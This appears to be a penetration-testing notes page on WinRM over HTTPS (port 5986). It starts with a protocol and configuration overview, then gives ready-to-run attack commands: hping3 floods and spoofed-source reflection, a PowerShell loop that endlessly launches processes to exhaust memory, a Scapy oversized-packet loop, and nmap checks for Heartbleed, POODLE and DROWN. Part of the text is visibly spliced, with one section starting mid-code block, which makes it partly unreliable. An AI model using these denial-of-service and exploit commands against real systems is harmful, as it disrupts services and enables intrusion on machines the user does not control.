# Windows Remote Management (WinRM) HTTPS
- **Port Number:** 5986
- **Protocol:** TCP
- **Service Name:** WinRM (Windows Remote Management) over HTTPS
- **Defined in:** Windows Operating Systems, WS-Management protocol (part of the DMTF standard)

Windows Remote Management (WinRM) is a protocol used for remotely managing Windows-based machines. When configured to use HTTPS, WinRM ensures that all communications are encrypted, providing a secure channel for remote management tasks. WinRM is based on the WS-Management protocol, which is a SOAP-based, firewall-friendly protocol that allows for hardware and operating system management.

## Overview of Features

- **Secure Communication:** By utilizing HTTPS, WinRM ensures that all data transferred between the client and server is encrypted using TLS, protecting against eavesdropping and man-in-the-middle attacks.
  
- **Remote Management:** WinRM allows administrators to execute commands, scripts, and manage services and processes on remote Windows machines.

- **WS-Management Protocol:** WinRM is built on the WS-Management protocol, which is standardized by the DMTF (Distributed Management Task Force) and supports a wide range of management tasks.

- **Authentication Support:** WinRM over HTTPS supports multiple authentication methods, including Kerberos, NTLM, and certificate-based authentication, allowing for flexible security configurations.

- **Firewall-Friendly:** The protocol is designed to work through firewalls, with HTTPS traffic typically allowed through most corporate firewalls.

## Typical Use Cases

- **Remote Administration:** Administering Windows servers remotely, including managing services, processes, and performing system diagnostics.

- **Automation:** Integrating with scripts and automation frameworks like PowerShell to automate administrative tasks across multiple Windows servers.

- **Centralized Management:** Used in environments where centralized management of multiple Windows machines is required, such as in data centers or large enterprise networks.

- **Secure Configuration:** Ensuring that all remote management operations are conducted over a secure channel to comply with security policies and regulations.

## How WinRM HTTPS Works

1. **Certificate Configuration:**
   - **Step 1:** A valid SSL/TLS certificate is installed on the server to enable HTTPS communication. This certificate can be self-signed or issued by a trusted Certificate Authority (CA).
   - **Step 2:** The certificate is bound to port 5986 to allow encrypted communication over HTTPS.

2. **Service Configuration:**
   - **Step 3:** WinRM is configured to use HTTPS by modifying the listener settings. This can be done using PowerShell or the `winrm` command-line utility.
   - **Step 4:** The service is started, and it listens for incoming connections on port 5986.

3. **Client Connection:**
   - **Step 5:** A client initiates a connection to the server on port 5986 using an HTTPS URL (e.g., `https://<target_ip>:5986/wsman`).
   - **Step 6:** The client and server perform a TLS handshake, where the server presents its certificate to the client.

4. **Authentication:**
   - **Step 7:** The client authenticates to the server using one of the supported methods (Kerberos, NTLM, or certificate-based authentication).
   - **Step 8:** Upon successful authentication, the client is granted access to WinRM services.

5. **Remote Command Execution:**
   - **Step 9:** The client sends commands, scripts, or queries to the server using SOAP messages encapsulated within HTTPS.
   - **Step 10:** The server processes these requests and sends back the results over the same secure channel.

6. **Connection Termination:**
   - **Step 11:** Once the remote management tasks are completed, the client can terminate the session, closing the HTTPS connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `<target_ip>`:5986 using HTTPS.
- **Server:** `<target_ip>` authenticates and executes the command received, returning the results to `<attack_ip>`.

# Additional Information

## Security Considerations
- **TLS Security:** WinRM over HTTPS relies heavily on the strength of the TLS configuration. Weak ciphers or outdated protocols (e.g., TLS 1.0) can compromise the security of the connection.
  
- **Authentication Mechanisms:** While Kerberos is preferred for its security, NTLM or certificate-based authentication may be used, each with its own security implications.

- **Firewall Configuration:** Ensure that port 5986 is open and that the firewall rules are correctly configured to allow WinRM traffic only from trusted sources.

- **Audit and Logging:** Monitoring and logging WinRM activity is critical for detecting unauthorized access attempts or potential breaches.

## Alternatives
- **SSH:** For environments where cross-platform compatibility is required, SSH might be used as an alternative to WinRM for secure remote management.
  
- **PowerShell Remoting:** Built on WinRM, PowerShell Remoting is often used for administrative tasks and offers advanced scripting capabilities.

## Advanced Usage
- **Just Enough Administration (JEA):** A security feature that allows you to delegate specific administrative tasks to users without giving them full administrative rights.

## Modes of Operation
- **Interactive Mode:** Administrators can open an interactive PowerShell session on a remote machine over HTTPS using WinRM.
  
- **Automated Mode:** Scripts and automation frameworks can execute predefined tasks across multiple machines without interactive login.

## Configuration Files

WinRM configuration is primarily handled via commands and registry settings, but for environments using `Group Policy`, the following can be relevant:

1. **PowerShell Commands for Configuration:**
- **Enable HTTPS Listener:**
  - Command:
    ```powershell
    winrm quickconfig -transport:https
    ```
  - **Description:** This command sets up a basic WinRM HTTPS listener.

2. **Manual Configuration:**
  - **File Location:** Settings are stored in the Windows registry under `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener`.
  - **Relevant Settings:**
    - `Transport`: Specifies the transport protocol, set to `HTTPS`.
    - `CertificateThumbprint`: Specifies the thumbprint of the certificate used for HTTPS.

3. **Group Policy Configuration:**
- **File Location:** Managed through Group Policy at `Computer Configuration > Administrative Templates > Windows Components > Windows Remote Management (WinRM) > WinRM Service`.
- **Configuration Example:**
  - Enable WinRM Service:
    - **Setting:** `Allow remote server management through WinRM`.
    - **Description:** Enables WinRM over HTTPS and configures security settings.

## Potential Misconfigurations

1. **Incorrect Certificate Configuration:**
   - **Risk:** Using an improperly configured or expired certificate can prevent secure connections or expose the server to man-in-the-middle attacks.
   - **Exploitation:** Attackers can use this to intercept traffic or perform SSL stripping attacks.

2. **Weak TLS Configuration:**
   - **Risk:** Allowing weak ciphers or protocols (e.g., TLS 1.0) can make the connection vulnerable to cryptographic attacks.
   - **Exploitation:** Attackers can use tools like SSL Labs or `sslscan` to identify weaknesses and potentially decrypt traffic.

3. **Open Port 5986 to the Internet:**
   - **Risk:** Exposing WinRM HTTPS to the public internet can lead to brute-force attacks or unauthorized access.
   - **Exploitation:** Attackers can target the exposed service with password guessing attacks or exploit vulnerabilities in the WinRM implementation.

## Default Credentials

WinRM itself does not have default credentials, but it relies on the Windows operating system's credentials for authentication. The following might be common in default setups:

- **Administrator Account:**
  - Username: `Administrator`
  - Password: Depends on the system setup (in some cases, it may be blank or a weak password on initial setup).

- **Local System Account:**
  - Username: `SYSTEM`
  - Password: Not applicable, as this account does not use traditional authentication.

    hping3 <target_ip> -p 5986 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 5986 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### SSL/TLS Handshake Flood
- **Tool:** [[HPing3 Cheat Sheet]]]
     ```bash
     hping3 <target_ip> -p 5986 -S --flood --rand-source -c 1000
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

### Memory Exhaustion via WinRM
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -UseSSL -ScriptBlock {while ($true) {1..10000 | % {Start-Process "notepad"}}}
    ```
- **Description:** Exhausts system memory by repeatedly launching processes via WinRM, leading to a denial of service.

### Service Crashing
- **Tool:** [[Scapy]]
	```bash
	from scapy.all import *
	packet = IP(dst="<target_ip>")/TCP(dport=5986,flags="S")/("A"*65000)
	send(packet, loop=1)
	```
- **Description:** Send malformed or oversized packets to the WinRM service, potentially causing it to crash.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 5986 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 5986 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 5986 <target_ip>
	```
